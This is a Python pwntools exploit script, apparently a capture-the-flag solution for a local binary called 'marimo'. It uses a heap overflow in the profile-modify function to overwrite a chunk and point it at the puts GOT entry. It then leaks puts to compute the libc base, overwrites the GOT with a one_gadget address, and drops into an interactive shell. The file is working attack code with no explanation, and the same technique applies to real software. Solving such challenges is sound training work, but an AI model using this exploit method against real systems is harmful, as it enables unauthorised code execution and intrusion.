#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./marimo")
gdb.attach(p)
elf = ELF("./marimo")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
puts_got = elf.got['puts']
offset = 0x45216

def marimo():
    p.sendlineafter(">> ", "show me the marimo")
    p.sendlineafter(">> ", 'A')
    p.sendlineafter(">> ", 'B')

def view(num):
    p.sendlineafter(">> ", 'V')
    p.sendlineafter(">> ", str(num))

def modify(profile):
    p.sendlineafter(">> ", 'M')
    p.sendlineafter(">> ", profile)

marimo()
marimo()
sleep(3)

view(0)
modify(p64(0)*5 + p64(0x21) + p32(0x5e3eca5b) + p32(1)  + p64(puts_got)*2)
p.sendlineafter(">> ", 'B')

view(1)
p.recvuntil("name : ")
puts = u64(p.recv(6).ljust(8, "\x00"))
libcBase = puts - libc.symbols['puts']
one_gadget = libcBase + offset
log.info("puts : "+hex(puts))
modify(p64(one_gadget))

p.interactive()

